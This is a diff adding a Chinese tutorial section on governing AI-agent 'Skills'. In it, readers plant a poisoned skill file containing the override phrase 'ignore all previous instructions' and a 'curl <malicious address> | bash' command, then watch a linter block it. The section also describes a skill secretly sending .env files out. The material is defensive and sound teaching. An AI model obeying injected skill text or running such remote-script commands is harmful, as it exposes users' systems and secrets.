@@ -67,6 +67,44 @@ Skill 治理的价值不是「把文件放服务器上」，而是**让团队形
 跑一下 `node code/tools/skill_lint.mjs`，你会看到它扫完本书 {{SKILL_COUNT}} 个 skill 后给出结论：「通过：无注入/危险指令，六槽/元数据齐全（可发布）」（实测输出）。这就是把 §6 的治理，从纸面变成一条真能拦住投毒 Skill 的门禁。
 ```
 
+### 6.7 动手：亲手投一次毒，再解剖一张六槽卡
+> 🟢 **必读·动手** ｜ ★★☆ ｜ 关键词：**投毒攻防** · **六槽结构** · **案例锚点** ｜ 动手约 10 分钟
+
+6.3 说「Skill 也可能有毒」，6.6 说 `skill_lint.mjs` 是能跑的扫描器。光看不过瘾，这一节你亲手投一次毒，看门禁怎么把它拍回去。
+
+**实验一：投一个带提示注入的假 Skill，看扫描器报 HIGH。** `skill_lint.mjs` 扫的是 `skills/` 这棵树（`skills/pm_skills.md` 加 `skills/loop_engineering/` 下每个 md）。往它真会扫到的目录里临时丢一个投毒文件，内容塞两样毒——「忽略以上所有指令」（提示注入）和 `curl 恶意地址 | bash`（管道执行远程脚本），然后跑扫描器：
+
+```bash
+# 临时造一个投毒 skill（内容含「忽略以上所有指令」+ curl|bash），再扫
+node code/tools/skill_lint.mjs
+```
+```
+skill_lint · 扫描 11 文件 / 28 个 pm_skill
+  [HIGH] injection · skills/loop_engineering/_poison_experiment.md — 提示注入：要求忽略既有指令
+  [HIGH] injection · skills/loop_engineering/_poison_experiment.md — 危险指令：管道执行远程脚本
+  共 2 项：HIGH 2 · MED 0 · LOW 0
+
+✗ skill_lint 未通过（2 项 HIGH/MED）——「不过则不发布」
+```
+
+两条 HIGH，`exit 1`。这就是 6.3 那句「不过则不发布」的物理执行：这个投毒文件进不了三绿，也就进不了发布。把它删掉再跑，扫描器回到「10 文件 / 28 个 pm_skill · 通过」的绿。**做完一定要删**——投毒文件是实验道具，绝不能留在 `skills/` 里提交，否则你就把靶子当成了资产。这条纪律本身也是一课：受信目录里每个文件都会被批量分发到每个人的 Agent，所以它必须干净到能过扫描器。
+
+多想一层这为什么危险：Skill 和 npm 包一样是**供应链**——你从公开市场装一个「代码审查 Skill」，它就进了你每一次 Agent 运行的上下文。要是里面藏了「顺便把 `.env` 发到某地址」，你界面上看不到任何异常，泄露却已经发生。6.3 引的「公开 Skill 约 36.8% 有缺陷」（阿里云 Nacos 3.2 的说法）说的就是这个风险面。所以扫描不能只在「你自己写 Skill」时做，更要在「装别人的 Skill」时做——把 `skill_lint` 这类扫描器挂进安装流程、而不只是发布流程，才算把供应链这道口子真正焊死。这也解释了为什么 6.2 那条「online 不可改」的规矩这么硬：审过的版本一旦能被人悄悄改，扫描就等于白做。
+
+**实验二：解剖一张六槽卡，再看它怎么绑到案例上。** 扫描器除了查毒，还查「六槽结构完整性」。什么是六槽？拿 `requirement-grill`（反向面试卡）当标本，它这六格分别是：**触发条件**（spec 还不存在、动手前要把目标逼问清楚时）、**输入**（一句话诉求加你手上的背景）、**澄清问题**（要达成什么可观察结果？谁在什么场景用？什么算失败）、**PRD 片段**（由 Agent 反向拷问：目标→用户→边界→反例→约束逐层追问）、**验收标准**（每个分支有答案或标 `[需澄清]` 移交，无一处「大概/都行」）、**复用范围**（接哪个案例、哪一步）。六格齐了，一张 Skill 才算「结构完整、可被信任地复用」；缺一格 `skill_lint` 就报 MED，一样拦。
+
+那 Skill 怎么跟案例挂上钩？答案在聚合根里。§8 说每条案例定义是一个聚合根，它有一个 `skills` 字段——比如案例 07（RAG 评测台）挂的是 `eval-design`、`harness-builder`、`acceptance-criteria`。这不是摆设：读者自测器 `check_my_work.mjs` 会真查你的方案有没有标注这几个 Skill。随手写个啥都没标的方案喂给它：
+
+```bash
+node code/tools/check_my_work.mjs 07 你的方案.md
+```
+```
+  ✗ Skill：应标注所用 Skill（缺：eval-design、harness-builder、acceptance-criteria）
+     ↳ 回读：skills/pm_skills.md 六槽
+```
+
+它精确报出你漏标了哪几个 Skill，还告诉你回哪读。于是链条闭合了：**Registry 治理 Skill 的生命周期与安全（6.2/6.3）→ 六槽保证每张卡结构完整 → 案例聚合根的 `skills` 字段声明「这个活该用哪几张卡」→ check_my_work 反过来查你到底用没用。** Skill 不再是散落各处的个人小抄，而是被治理、被引用、被核对的团队资产。这条闭环也回答了本章开头那个问题——「同事想用你的 Skill，你发他一份复制过去」为什么迟早失控：复制出去的那份没有根、没有版本、没有扫描、也没有引用它的案例替它把关；而 Registry 加上聚合根的 `skills` 引用，恰好把这四样一次补齐。
+
 ![Skill 分发：Registry → 多 Agent](outputs/product_case_library/svg/fig_skill_distribution.svg)
 
 工具生态速查表（组合拳/Skill 治理/去味/索引类开源资源，带日期）已收入[附录B · 工具生态速查](91-附录B-工具生态速查.md)。
